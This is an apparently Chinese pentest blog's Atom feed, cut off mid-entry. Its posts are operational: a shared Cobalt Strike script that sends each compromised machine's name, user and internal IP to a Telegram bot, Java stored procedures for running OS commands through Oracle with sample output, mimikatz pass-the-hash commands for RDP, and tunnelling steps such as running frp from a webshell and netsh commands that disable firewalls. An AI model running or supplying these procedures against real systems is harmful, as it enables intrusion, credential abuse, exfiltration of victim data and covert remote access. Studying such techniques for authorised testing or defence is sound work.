<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Dayu</title>
  
  <subtitle>sCRiPt n00b</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://dayu.ink/"/>
  <updated>2019-06-13T14:39:29.000Z</updated>
  <id>https://dayu.ink/</id>
  
  <author>
    <name>大宇</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Cobalt Strike  beacon上线通知  脚本分享</title>
    <link href="https://dayu.ink/webhook-cna.html"/>
    <id>https://dayu.ink/webhook-cna.html</id>
    <published>2019-06-13T14:30:58.000Z</published>
    <updated>2019-06-13T14:39:29.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Cobalt Strike应该是大家耳熟能详的工具了，它支持在客户端添加自定义的cna脚本来扩展功能。</p><p>beacon上线后，我们通常想第一时间得知，以前见过msf上线后，tg通知的脚本，于是想找个cs的。</p><p>我在github找到了slack的通知脚本slack-notify-beacon.cna，虽然也找到了一个telegram通知的，但是写的太麻烦，还要调用Python，于是自己改写了一个telegram-bot通知的。</p><a id="more"></a><h2 id="0x02-脚本"><a href="#0x02-脚本" class="headerlink" title="0x02 脚本"></a>0x02 脚本</h2><p>telegram-notify-beacon.cna</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># author: dayu</span><br><span class="line"></span><br><span class="line"># ------------ set these config: ------------</span><br><span class="line">$bot_token = &quot;xxxxxxx&quot;;</span><br><span class="line">$chat_id = &apos;xxxxxxx&apos;;     # Write your group_id or user_id</span><br><span class="line">$teamserver_hostname = &apos;HOSTNAME-1&apos;;    # You will reveive message containing it</span><br><span class="line"># -------------------------------------------</span><br><span class="line"></span><br><span class="line">$tg_bot_webhookURL = &apos;https://api.telegram.org/bot&apos;.$bot_token.&apos;/sendMessage&apos;;</span><br><span class="line"></span><br><span class="line">$test_message = &apos;this is a test message, test success&apos;;</span><br><span class="line">@curl_command = @(&apos;curl&apos;, &apos;-X&apos;, &apos;POST&apos;, &apos;--data-urlencode&apos;, &apos;chat_id=&apos;.$chat_id, &apos;--data-urlencode&apos;, &apos;text=&apos;.$test_message, $tg_bot_webhookURL);</span><br><span class="line">exec(@curl_command);</span><br><span class="line"></span><br><span class="line">on beacon_initial &#123;</span><br><span class="line">    println(&quot;Initial Beacon Checkin: &quot; . $1 . &quot; PID: &quot; . beacon_info($1, &quot;pid&quot;));</span><br><span class="line">    local(&apos;$internalIP $computerName $userName&apos;);</span><br><span class="line">    $internalIP = replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName = replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $userName = replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $message = &apos;Message from &apos;.$teamserver_hostname.&apos; Server%0aBeacon success implant Info Target:%0aComputer name : &apos;.$computerName.&apos;%0aUsername : &apos;.$userName.&apos;%0aIpaddres : &apos;.$internalIP;</span><br><span class="line">    @curl_command = @(&apos;curl&apos;, &apos;-X&apos;, &apos;POST&apos;, &apos;--data-urlencode&apos;, &apos;chat_id=&apos;.$chat_id, &apos;--data&apos;, &apos;text=&apos;.$message, $tg_bot_webhookURL);</span><br><span class="line">    exec(@curl_command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要 客户端支持curl、能够访问tg的api地址（国内访问不到）</p><p>原理很简单，beacon_initial 后通过调用os的curl请求webhook，bot的申请教程可以百度，同理可以很简单的改写其他webhook，如：钉钉、Server酱等</p><p>效果图：<br><img src="https://oss.dayu.ink/webhook_cna/1.png?x-oss-process=style/blog" alt></p><h2 id="0x03-在teamserver上运行cna脚本"><a href="#0x03-在teamserver上运行cna脚本" class="headerlink" title="0x03 在teamserver上运行cna脚本"></a>0x03 在teamserver上运行cna脚本</h2><p>把cna脚本添加到本地客户端后，如果beacon上线了，这个webhook的通知请求 是从客户端发出的。</p><p>那么问题来了，如果我要接收通知，是不是就得一直开着客户端连着teamserver？？ ？</p><p>这样就非常不方便了，而且如果网络有波动，断开了到teamserver的连接，就收不到通知了。</p><p>有个解决思路，在teamserver服务器上也开一个客户端，直接连到teamserver并添加cna脚本，这样就可以让teamserver服务器发出webhook通知了嘛，而且客户端也不会因为网络波动断开。</p><p>由于tm服务器通常是没有桌面环境的linux系统，不能运行界面化的客户端。</p><p>在微信群里SuperDong老哥的提醒下，得知可以运行无界面的客户端专门跑cna脚本，菜鸡的我表示长知识了，命令如下，agscript为cs自带的shell脚本</p><p> ./agscript [host] [port] [user] [password] [/path/to/script.cna]</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://github.com/michalkoczwara/aggressor_scripts_collection/blob/master/slack-notify-beacon.cna" target="_blank" rel="noopener">https://github.com/michalkoczwara/aggressor_scripts_collection/blob/master/slack-notify-beacon.cna</a></p><p><a href="https://github.com/wahyuhadi/Pentest/blob/0a2544818281f72b409d91766f810abe512585a3/Red%20Team/cobaltsrike-notif-beacon/notif_telegram.cna" target="_blank" rel="noopener">https://github.com/wahyuhadi/Pentest/blob/0a2544818281f72b409d91766f810abe512585a3/Red%20Team/cobaltsrike-notif-beacon/notif_telegram.cna</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h2&gt;&lt;p&gt;Cobalt Strike应该是大家耳熟能详的工具了，它支持在客户端添加自定义的cna脚本来扩展功能。&lt;/p&gt;
&lt;p&gt;beacon上线后，我们通常想第一时间得知，以前见过msf上线后，tg通知的脚本，于是想找个cs的。&lt;/p&gt;
&lt;p&gt;我在github找到了slack的通知脚本slack-notify-beacon.cna，虽然也找到了一个telegram通知的，但是写的太麻烦，还要调用Python，于是自己改写了一个telegram-bot通知的。&lt;/p&gt;
    
    </summary>
    
      <category term="Pentest" scheme="https://dayu.ink/categories/Pentest/"/>
    
    
      <category term="Pentest" scheme="https://dayu.ink/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>通过Oracle执行系统命令</title>
    <link href="https://dayu.ink/Oracle-get-os-shell.html"/>
    <id>https://dayu.ink/Oracle-get-os-shell.html</id>
    <published>2019-04-04T12:30:58.000Z</published>
    <updated>2019-06-26T12:39:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>成功连接上Oracle后，如何通过Oracle get到os-shell，网上搜集资料解决后进行简单记录。</p><a id="more"></a><p>经历如下：内网中发现oralce em express服务，一个oracle的web管理端，碰撞密码进入后，没有找到什么getshell的点，甚至数据查询等也没有发现，无意中发现了<em>dis</em>pather设置项，通过添加dispather监听0.0.0.0后成功连接上数据库（默认的1521是监听在127.0.0.1上的）。</p><h2 id="oracle提权执行命令工具oracleShell-v0-1"><a href="#oracle提权执行命令工具oracleShell-v0-1" class="headerlink" title="oracle提权执行命令工具oracleShell v0.1"></a>oracle提权执行命令工具oracleShell v0.1</h2><p>为了快速getshell，通常先去找找有没有现成的实现，找到了rebeyond师傅写的一个小工具。</p><p>链接：<a href="https://www.cnblogs.com/rebeyond/p/7928887.html" target="_blank" rel="noopener">https://www.cnblogs.com/rebeyond/p/7928887.html</a></p><p>环境中的oracle版本为12c，这款工具是前两年开发，集成的jdbc版本低，不支持12c新的连接协议，连接会报ORA-28547错误，11g以下的版本应该是可以使用的。</p><h2 id="使用sql-plus"><a href="#使用sql-plus" class="headerlink" title="使用sql*plus"></a>使用sql*plus</h2><p>Oracle的sql*plus是与oracle进行命令行交互的客户端工具，安装oracle一般会自带。</p><p>连接命令分两种（dba用户登录时带上as sysdba）：</p><ol><li>sqlplus 用户名/密码@ip:port/sid [as sysdba]</li><li>sqlplus /nolog<br>SQL&gt; conn 用户名/密码@ip:port/sid [as sysdba]</li></ol><p>sqlplus自带了一个比较坑的命令host</p><p>SQL&gt; host hostname</p><p>你会发现显示的是你本机的机器名，原来是在本机上执行命令，而不是在连接的远程机器上，好吧。。。</p><p>网上找来的方法：</p><p>首先在本地新建3个sql文件，用于sqlplus连接后进行执行</p><p>新建1.sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">create or replace and compile</span><br><span class="line">java souRCe named &quot;util&quot;</span><br><span class="line">as</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.*;</span><br><span class="line">public class util extends Object</span><br><span class="line">&#123;</span><br><span class="line">public static int RunThis(String args)</span><br><span class="line">&#123;</span><br><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">int RC = -1;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">Process p = rt.exec(args);</span><br><span class="line">int bufSize = 4096;</span><br><span class="line">BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), bufSize);</span><br><span class="line">int len;</span><br><span class="line">byte buffer[] = new byte[bufSize];</span><br><span class="line">// Echo back what the program spit out</span><br><span class="line">while ((len = bis.read(buffer, 0, bufSize)) != -1)</span><br><span class="line">System.out.write(buffer, 0, len);</span><br><span class="line">RC = p.waitFor();</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception e)</span><br><span class="line">&#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">RC = -1;</span><br><span class="line">&#125;</span><br><span class="line">finally</span><br><span class="line">&#123;</span><br><span class="line">return RC;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建2.sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create or replace</span><br><span class="line">function run_cmd(p_cmd in varchar2) return number</span><br><span class="line">as</span><br><span class="line">language java</span><br><span class="line">name &apos;util.RunThis(java.lang.String) return integer&apos;;</span><br></pre></td></tr></table></figure></p><p>新建3.sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">create or replace procedure RC(p_cmd in varChar)</span><br><span class="line">as</span><br><span class="line">x number;</span><br><span class="line">begin</span><br><span class="line">x := run_cmd(p_cmd);</span><br><span class="line">end;</span><br></pre></td></tr></table></figure></p><p>登陆上去后依次执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; @1.sql</span><br><span class="line"> 35  /</span><br><span class="line"> </span><br><span class="line">Java 已创建。</span><br><span class="line"> </span><br><span class="line">SQL&gt; @2.sql</span><br><span class="line">  6  /</span><br><span class="line"> </span><br><span class="line">函数已创建。</span><br><span class="line"> </span><br><span class="line">SQL&gt; @3.sql</span><br><span class="line">  7  /</span><br><span class="line"> </span><br><span class="line">过程已创建。</span><br><span class="line"> </span><br><span class="line">SQL&gt;</span><br><span class="line">SQL&gt; variable x number;</span><br><span class="line">SQL&gt; set serveroutput on;</span><br><span class="line">SQL&gt; exec dbms_java.set_output(100000);</span><br><span class="line">SQL&gt; grant javasyspriv to system;   [这里的system换成你的登录名,dba账户不需要执行这一步]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">PL/SQL 过程已成功完成。</span><br><span class="line"> </span><br><span class="line">SQL&gt; exec :x:=run_cmd(&apos;ipconfig&apos;);</span><br><span class="line"> </span><br><span class="line">Windows IP Configuration</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Ethernet adapter 本地连接:</span><br><span class="line"> </span><br><span class="line">Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">IP Address. . . . . . . . . . . . : 192.168.91.130</span><br><span class="line">Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">Default Gateway . . . . . . . . . : 192.168.91.1</span><br><span class="line"> </span><br><span class="line">PL/SQL 过程已成功完成。</span><br><span class="line"></span><br><span class="line">SQL&gt; exec :x:=run_cmd(&apos;whoami&apos;);    可以继续执行其他命令</span><br></pre></td></tr></table></figure><p>win2003 + Oracle 11g，win2008 + Oracle 11g，win2008 + Oracle 12c 测试成功</p><p>我虽然使用sys登录，可惜的是拿到的系统权限还是很低。</p><p>后续还要对oracle以及oracle的安全问题原理进行研究。</p><p>2019-5-1更新:<br>发现了一个更加方便好用的工具：odat，github可以搜索到。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/xiaozi/p/6017322.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/6017322.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;成功连接上Oracle后，如何通过Oracle get到os-shell，网上搜集资料解决后进行简单记录。&lt;/p&gt;
    
    </summary>
    
      <category term="Pentest" scheme="https://dayu.ink/categories/Pentest/"/>
    
    
      <category term="Pentest" scheme="https://dayu.ink/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>pth-&gt;mstsc.exe 登录rdp</title>
    <link href="https://dayu.ink/pth-mstsc.html"/>
    <id>https://dayu.ink/pth-mstsc.html</id>
    <published>2019-01-02T12:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>在内网渗透测试中，获得ntlm hash后，通常使用pass the hash方法使用wmi(135端口)，smb(445端口)服务横向移动，同样我们可以pth到mstsc</p><a id="more"></a><h3 id="条件限制"><a href="#条件限制" class="headerlink" title="条件限制"></a>条件限制</h3><p>Server需要开启Restricted Admin mode，Client需要支持Restricted Admin mode</p><p>所谓Restricted Admin mode，意思就是直接使用当前系统的登录凭据登录，无需口令，也正是由于此特性，才使得我们可以通过pth登录rdp</p><p>主要针对Windows Server 2012 R2以后的系统，默认支持Restricted Admin mode</p><p>Windows 7 和 Windows Server 2008 R2默认不支持，需要安装补丁2871997、2973351</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><p>使用mimikatz执行命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxxxxxxxxxxxxxxxxxx &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure><p>执行后弹出远程登录界面，输入地址后登录</p><p><img src="https://oss.dayu.ink/pth_mstsc/1.png?x-oss-process=style/blog" alt></p><p>10.0.0.180为08系统，默认不支持Restricted Admin mode，会报错</p><p><img src="https://oss.dayu.ink/pth_mstsc/2.png?x-oss-process=style/blog" alt></p><p>2012系统测试登录成功</p><p><img src="https://oss.dayu.ink/pth_mstsc/3.png?x-oss-process=style/blog" alt></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>Restricted Admin mode 官方说明 <a href="https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/" target="_blank" rel="noopener">https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在内网渗透测试中，获得ntlm hash后，通常使用pass the hash方法使用wmi(135端口)，smb(445端口)服务横向移动，同样我们可以pth到mstsc&lt;/p&gt;
    
    </summary>
    
      <category term="Pentest" scheme="https://dayu.ink/categories/Pentest/"/>
    
    
      <category term="pentest" scheme="https://dayu.ink/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透中常用的隧道工具</title>
    <link href="https://dayu.ink/pentest-common-tunnel.html"/>
    <id>https://dayu.ink/pentest-common-tunnel.html</id>
    <published>2018-12-30T05:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>tunnel</p><a id="more"></a><hr><h1 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h1><h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><p><code>https://github.com/fatedier/frp/</code></p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul><li>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透</li><li>跨平台支持linux，win，mac</li><li>类似于ngrok，运维、开发人员经常使用它管理内网机器和调试程序，例如将内网的22，3389转发到公网，开发人员将本地web服务转发到公网调试，msf/rat远控的内网上线，可以代替前几年流行的”内网通”服务</li><li>优点：不需要免杀，支持加密传输</li></ul><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h4><ul><li><p>在有公网ip的vps上部署服务端，然后在目标的内网机器上运行客户端即可反连公网机器，根据配置把内网中的目的端口转发到公网的那台机器上。网上也有一些免费和收费frp服务，可以免去自己部署服务端。</p></li><li><p>简单示例：<br>服务端和客户端均支持配置文件ini运行和命令行运行，下面示例为命令行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务端：./frps -p &lt;服务监听端口&gt; -t &lt;token&gt;</span><br><span class="line">客户端：./frpc tcp -s &lt;服务端ip&gt;:&lt;服务端端口&gt; -r &lt;在服务端监听的对应端口&gt; -i &lt;内网地址&gt; -l &lt;内网端口&gt; -t &lt;token&gt; --ue --uc</span><br></pre></td></tr></table></figure><p>–ue –uc 分别为加密和压缩(use_encryption &amp;&amp; use_compression)</p><p>例如通过webshell转发出该机器的3389端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">你的机器：./frps -p 7890 -t woshitoken</span><br><span class="line">Webshell: frpc.exe tcp -s 1.1.1.1:7890 -r 9999 -i 127.0.0.1 -l 3389 -t woshitoken --ue --uc</span><br></pre></td></tr></table></figure><p>此时访问你机器的9999端口，即可访达目标机器的3389端口。</p></li><li><p>更多参数用法查看github项目。</p></li></ul><hr><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul><li><p>SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发</p></li><li><p>优点：linux自带，传输加密，支持socks代理</p></li></ul><h4 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h4><h4 id="相关参数："><a href="#相关参数：" class="headerlink" title="相关参数："></a>相关参数：</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-C ：压缩数据传输。</span><br><span class="line">-f ：后台认证用户/密码，通常和-N连用，不用登录到远程主机。</span><br><span class="line">-N ：不执行脚本或命令，通常与-f连用。</span><br><span class="line">-g ：在-L/-R/-D参数中，允许远程主机连接到建立的转发的端口，如果不加这个参数，只允许本地主机建立连接。</span><br><span class="line">-L ：本地转发</span><br><span class="line">-R ：远程转发</span><br><span class="line">-D ：动态转发，即socks代理</span><br></pre></td></tr></table></figure><h5 id="本地转发（本地建立监听）"><a href="#本地转发（本地建立监听）" class="headerlink" title="本地转发（本地建立监听）"></a>本地转发（本地建立监听）</h5>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -C -f -N -g -L &lt;本地监听ip&gt;:&lt;本地端口&gt;:&lt;远程ip&gt;:&lt;远程端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;</span><br><span class="line">ssh -C -f -N -g -L 0.0.0.0:1234:192.168.1.100:3389 root@192.168.2.101 -p 22</span><br></pre></td></tr></table></figure><h5 id="远程转发（远端建立监听）"><a href="#远程转发（远端建立监听）" class="headerlink" title="远程转发（远端建立监听）"></a>远程转发（远端建立监听）</h5>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -C -f -N -g -R &lt;远程ip&gt;:&lt;远程端口&gt;:&lt;本地ip&gt;:&lt;本地端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;</span><br><span class="line">ssh -C -f -N -g -R 0.0.0.0:1234:192.168.5.2:3389 root@192.168.2.101 -p 22</span><br></pre></td></tr></table></figure><p>  注：如果远端不能监听0.0.0.0，以下两个方法：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 需要修改 ssh 配置/etc/ssh/sshd_config</span><br><span class="line">   GatewayPorts 项写为 yes </span><br><span class="line">   重启ssh后即可监听0.0.0.0</span><br><span class="line"></span><br><span class="line">2. 使用rinetd把监听在127.0.0.1转发到0.0.0.0上</span><br></pre></td></tr></table></figure></p><h5 id="动态转发（socks）"><a href="#动态转发（socks）" class="headerlink" title="动态转发（socks）"></a>动态转发（socks）</h5>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -C -f -N -g -D &lt;本地ip&gt;:&lt;本地端口&gt; 用户名@目标IP -p &lt;ssh端口&gt;</span><br><span class="line">ssh -C -f -N -g -D 0.0.0.0:1080 root@192.168.2.101 -p 22</span><br></pre></td></tr></table></figure><p>  socks代理上本地的1080端口，即可访问192.168.2.101的内网环境</p><hr><h1 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h1><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><ul><li>netsh是Network Shell的缩写，是windows为我们提供的功能强大的网络配置命令行工具。</li><li>支持tcp，udp 正向端口转发和修改防火墙规则，没有反向转发的功能，不支持socks。</li><li>优点：win自带，支持ipv4和v6。</li></ul><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><ul><li><p>在xp/2003下使用，要先安装ipv6，装完后需要重启机器才能生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface ipv6 install</span><br></pre></td></tr></table></figure></li></ul><h5 id="管理防火墙"><a href="#管理防火墙" class="headerlink" title="管理防火墙"></a>管理防火墙</h5><ul><li><p>对于xp/2003的操作命令不同与之后的系统，而且xp/2003的防火墙不区分出站入站</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state 可查看防火墙的状态，从显示结果中可看到防火墙各功能模块的禁用及启用情况。</span><br><span class="line">netsh firewall set opmode disable 用来禁用系统防火墙</span><br><span class="line">netsh firewall set opmode enable 可启用防火墙。</span><br><span class="line"></span><br><span class="line">netsh firewall add portopening TCP &lt;端口号&gt; &quot;规则名称&quot;   允许xx端口出入站</span><br><span class="line">netsh firewall delete portopening TCP &lt;端口号&gt;          删除该条规则</span><br></pre></td></tr></table></figure></li><li><p>对于 2003 以后的系统，命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofiles 查看防火墙的状态</span><br><span class="line">netsh advfirewall set allprofiles state on 开启防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off 关闭防火墙</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;规则名称&quot; dir=in(in为入站,out为出站) action=allow(allow为放行，block为阻止) protocol=TCP localport=&lt;端口号&gt;     添加规则</span><br><span class="line">netsh advfirewall firewall delete rule name=&quot;规则名称&quot; dir=in protocol=TCP localport=&lt;端口号&gt;      删除规则</span><br></pre></td></tr></table></figure></li></ul><h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy show all   查看所有已设置的转发规则</span><br><span class="line">netsh interface portproxy add v4tov4 listenport=&lt;监听端口&gt; connectaddress=&lt;将要转发的ip&gt; connectport=&lt;将要转发的端口&gt;   添加转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=&lt;转发的端口&gt;   删除规则</span><br></pre></td></tr></table></figure><hr><h1 id="ew（EarthWorm）"><a href="#ew（EarthWorm）" class="headerlink" title="ew（EarthWorm）"></a>ew（EarthWorm）</h1><h4 id="项目地址-1"><a href="#项目地址-1" class="headerlink" title="项目地址"></a>项目地址</h4><p><code>https://github.com/rootkiter/EarthWorm</code></p><p><code>https://github.com/rootkiter/EarthWorm/blob/master/server/download/ew.zip</code></p><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><ul><li>支持正反向tcp端口转发，类似lcx（htran）</li><li>支持反向socks代理</li><li>缺点：流量不加密，需要免杀</li></ul><h4 id="用法简要说明"><a href="#用法简要说明" class="headerlink" title="用法简要说明"></a>用法简要说明</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-l 本地要监听的端口</span><br><span class="line">-f 要主动连接的ip</span><br><span class="line">-g 要主动连接的端口</span><br><span class="line">-d 要反弹到的ip</span><br><span class="line">-e 要反弹到的端口</span><br><span class="line">-s 工作模式</span><br><span class="line"></span><br><span class="line">工作模式支持如下：</span><br><span class="line">lcx_tran 正向tcp端口转发，监听在本地</span><br><span class="line">lcx_slave 反向tcp转发客户端</span><br><span class="line">lcx_listen 反向tcp服务端</span><br><span class="line">ssocksd 创建正向socks代理服务端，监听在本地，直接把当前环境socks代理出去</span><br><span class="line">rssocks 创建反向socks代理服务端</span><br><span class="line">rcsocks 反向socks代理客户端</span><br></pre></td></tr></table></figure><hr><h1 id="reGeorg-amp-ABPTTS"><a href="#reGeorg-amp-ABPTTS" class="headerlink" title="reGeorg&amp;ABPTTS"></a>reGeorg&amp;ABPTTS</h1><h4 id="项目地址-2"><a href="#项目地址-2" class="headerlink" 